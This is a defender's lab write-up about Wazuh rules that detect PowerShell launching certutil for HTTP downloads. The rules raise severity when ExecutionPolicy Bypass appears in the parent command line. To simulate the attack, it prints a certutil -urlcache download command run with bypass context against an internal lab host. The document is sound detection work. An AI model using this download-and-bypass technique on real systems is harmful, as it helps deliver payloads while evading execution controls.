\# Behaviour Chaining — Certutil Download + PowerShell Bypass (Day 19)



\## Objective

Detect a multi-step behaviour pattern where \*\*PowerShell\*\* launches \*\*certutil\*\* to perform an \*\*HTTP download\*\*, and increase confidence when the parent PowerShell context includes \*\*ExecutionPolicy Bypass\*\*.



This is designed to move beyond “single-event” detections into \*\*behaviour reasoning + confidence layering\*\* (SOC engineer mindset).



---



\## Threat Context

Attackers commonly use LOLBins like \*\*certutil.exe\*\* to download payloads (Ingress Tool Transfer). When this download is spawned from PowerShell—especially with \*\*ExecutionPolicy Bypass\*\*—the likelihood of malicious intent increases.



---



\## Environment

\- SIEM: Wazuh (Manager / Indexer / Dashboard) on Ubuntu Server VM

\- Endpoint: Windows 11 (`WIN-ENDPOINT-01`)

\- Telemetry: Sysmon → Wazuh (`windows\_eventchannel`)

\- Log source: `Microsoft-Windows-Sysmon/Operational`



---



\## Attack Simulation (Safe Lab Test)

To generate real telemetry for behaviour chaining:



1\. Hosted a test file on Ubuntu using a Python HTTP server (internal lab network).

2\. On Windows, executed certutil download via PowerShell, with bypass context:



```powershell

certutil.exe -urlcache -split -f http://192.168.72.130:2222/day19.txt C:\\Temp\\dl\_day19.txt





The certutil Sysmon event contained:



* Image: C:\\Windows\\System32\\certutil.exe
* CommandLine: ... -urlcache -split -f http://...
* ParentImage: ...\\powershell.exe
* ParentCommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass



\## Telemetry Validation (archives.json)

Validated raw Sysmon Process Create fields in archives.json before writing rules:



* win.eventdata.image
* win.eventdata.commandLine
* win.eventdata.parentImage
* win.eventdata.parentCommandLine
* win.eventdata.parentProcessGuid



This enabled accurate matching and confidence layering.





\## Detection Logic (Wazuh Rules)

\### Rule IDs

* 200805 — Behaviour anchor refinement (chained from existing certutil detection)
* 200815 — Confidence boost when parent PowerShell includes ExecutionPolicy Bypass



\### Behaviour Anchor (200805)

Triggers when a certutil download is spawned by PowerShell with HTTP(S) URL indicators (-urlcache, -split, -f http(s)://).



\### Confidence Boost (200815)

Upgrades severity when the parent PowerShell command line includes:

* ExecutionPolicy Bypass



\## MITRE ATT\&CK Mapping

* T1105 — Ingress Tool Transfer
* T1059.001 — Command and Scripting Interpreter: PowerShell



\## Results (alerts.json Evidence) 

High-confidence detection fired successfully:

* Rule ID: 200815
* Description: Day19 Confidence Boost: Certutil download where parent PowerShell used ExecutionPolicy Bypass
* Key Evidence: ParentCommandLine contained -ExecutionPolicy Bypass



\## False Positive Notes

Possible legitimate certutil usage exists in enterprise environments. Confidence is increased specifically when:

* Certutil is launched from PowerShell and
* PowerShell uses ExecutionPolicy Bypass

This combination is significantly more suspicious than certutil alone.

